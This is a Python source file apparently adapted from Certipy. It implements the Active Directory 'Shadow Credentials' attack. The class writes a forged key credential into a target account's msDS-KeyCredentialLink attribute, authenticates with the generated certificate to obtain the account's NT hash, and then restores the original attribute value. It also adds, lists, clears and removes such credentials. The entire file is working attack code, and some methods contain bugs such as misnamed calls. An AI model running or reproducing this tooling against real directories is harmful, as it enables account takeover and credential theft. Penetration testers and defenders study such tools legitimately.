from typing import List, Tuple
import ldap3
import OpenSSL
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.common.data.DNWithBinary import DNWithBinary
from dsinternals.common.data.hello.KeyCredential import KeyCredential
from dsinternals.system.DateTime import DateTime
from dsinternals.system.Guid import Guid

from certipy.lib.certificate import create_pfx, der_to_cert, der_to_key, rsa, x509
from certipy.lib.ldap import LDAPEntry
from certipy.lib.logger import logging
from certipy.lib.target import Target

from delta2.scripts.adcs.ldap import Connection
from delta2.scripts.adcs.auth import Authenticate

class Shadow:
    def __init__(self, target: Target, connection: Connection, account:str, device_id:str=None, out:str=None, scheme:str="ldaps"):
        self.verbose = False
        self.target = target
        self.account = account
        self.device_id = device_id
        self.out = out
        self.scheme = scheme
        self.connection = connection.connection

    def get_key_credentials(self, target_dn:str, user:LDAPEntry) -> List[bytes]:
        results = self.connection.search(search_base=target_dn, search_filter="(objectClass=*)", attributes=["SAMAccountName", "objectSid", "msDS-KeyCredentialLink"])
        if len(results) == 0:
            raise Exception(f"Could not get credentials for: {user.get('sAMAccountName')}")
        result = results[0]
        return result.get_raw("msDS-KeyCredentialLink")
    def set_key_credentials(self, target_dn:str, user: LDAPEntry, key_credential: List[bytes]):
        result = self.connection.modify(
            target_dn,
            {"msDS-KeyCredentialLink": [ldap3.MODIFY_REPLACE, key_credential]}
        )
        message = result["message"]
        code = result["result"]
        codes = {50:"insufficient access rights", 19:"constraint violation"}
        if code == 0:
            return True
        try:
            error = codes[code] + f": {message}"
        except Exception:
            error = message
        raise Exception(error)
    
    def generate_key_credential(self, target_dn:str, subject:str) -> Tuple[X509Certificate2, KeyCredential, str]:
        if len(subject) >= 64:
            subject = subject[:64]
        
        cert = X509Certificate2(
            subject=subject,
            keySize=2048,
            notBefore=(-40*365),
            notAfter=(40*365),
        )
        key_credential = KeyCredential.fromX509Certificate2(
            certificate=cert,
            deviceId=Guid(),
            owner=target_dn,
            currentTime=DateTime(),
        )
        device_id = key_credential.DeviceId.toFormatD()
        return (cert, key_credential, device_id)
    
    def add_new_key_credential(self, target_dn:str, user:  LDAPEntry) -> Tuple[X509Certificate2, KeyCredential, List[bytes], str]:
        cert, key_credential, device_id = self.generate_key_credential(target_dn, f"CN={user.get('sAMAccountName')}")
        saved_key_credential = self.get_key_credentials(target_dn, user)
        if saved_key_credential is None:
            return None
        new_key_credential = saved_key_credential + [key_credential.toDNWithBinary().toString()]
        result = self.set_key_credentials(target_dn, user, new_key_credential)
        if result is False:
            return None
        return (cert, new_key_credential, saved_key_credential, device_id)
    
    def get_key_and_certificate(self, cert: X509Certificate2) -> Tuple[rsa.RSAPrivateKey, x509.Certificate]:
        key = der_to_key(
            OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_ASN1, cert.key)
        )
        cert = der_to_cert(
            OpenSSL.crypto.dump_certificate(
                OpenSSL.crypto.FILETYPE_ASN1, cert.certificate
            )
        )

        return (key, cert)
    
    def auto(self):
        user = self.connection.get_user(self.account)
        if user is None:
            raise Exception("User must be set!")
        target_dn = user.get("distinguishedName")

        result = self.add_new_key_credential(target_dn, user)
        if result is None:
            return False
        cert, _, saved_key_credential, _ = result
        key, cert = self.get_key_and_certificate(cert)

        authenticate = Authenticate(self.target, cert=cert, key=key)
        authenticate.authenticate(
            username=user.get("sAMAccountName"), is_key_credential=True
        )
        result = self.set_key_credentials(target_dn, user, saved_key_credential)

        return authenticate.nt_hash
    def add(self):
        user = self.connection.get_user(self.account)
        if user is None:
            return False
        target_dn = self.connection.get("distinguishedName")

        result = self.add_new_key_credential(target_dn, user)
        if result is None:
            return False
        cert,_,_,device_id = result
        key, cert = self.get_key_and_certificate(cert)
        out = self.out
        pfx = create_pfx(key, cert)
        return pfx
    
    def list(self) -> List[dict]:
        user = self.connection.get_user(self.account)
        if user is None:
            return False
        target_dn = user.get("distinguishedName")
        data = []
        key_credentials = self.get_key_credentials(target_dn, user)
        if key_credentials is None:
            return False
        if len(key_credentials) == 0:
            raise Exception("The Key Credentials attribute for %s is either empty or the current user does not have read permissions for the attribute"
                % repr(user.get("sAMAccountName")))
        for dn_binary_value in key_credentials:
            key_credential = KeyCredential.fromDNWithBinary(
                DNWithBinary.fromRawDNWithBinary(dn_binary_value)
            )
            data.append({"deviceId":key_credential.DeviceId.toFormatD(), "creationtime": key_credential.CreationTime})
        return data

    def clear(self) -> bool:
        user = self.connection.get_use(self.account)
        if user is None:
            return False
        target_dn = user.get("distinguishedName")
        result = self.set_key_credentials(target_dn, user, [])
        return result

    def remove(self) -> bool:
        if self.device_id is None:
            raise Exception("A device ID is required for the remove operation")
        user = self.connection.get_user(self.account)
        if user is None:
            return False
        target_dn = user.get("distinguishedName")
        key_credentials = self.get_key_credentials(target_dn, user)
        if len(key_credentials) == 0:
            raise Exception(
                "The Key Credentials attribute for %s is either empty or the current user does not have read permissions for the attribute"
                % repr(user.get("sAMAccountName"))
            )
        device_id = self.device_id
        new_key_credentials = []
        device_id_in_current_values = False
        for dn_binary_value in key_credentials:
            key_credential = KeyCredential.fromDNWithBinary(
                DNWithBinary.fromRawDNWithBinary(dn_binary_value)
            )
            if key_credential.DeviceId.fromFormatD() == device_id:
                device_id_in_current_values = True
            else:
                new_key_credentials.append(dn_binary_value)
        
        if device_id_in_current_values == True:
            result = self.set_key_credentials(target_dn, user, new_key_credentials)
            if result == True:
                return result
        else:
            raise Exception(
                "Could not find device ID %s in Key Credentials for %s"
                % (repr(device_id), repr(user.get("sAMAccountName")))
            )

    def info(self):
        pass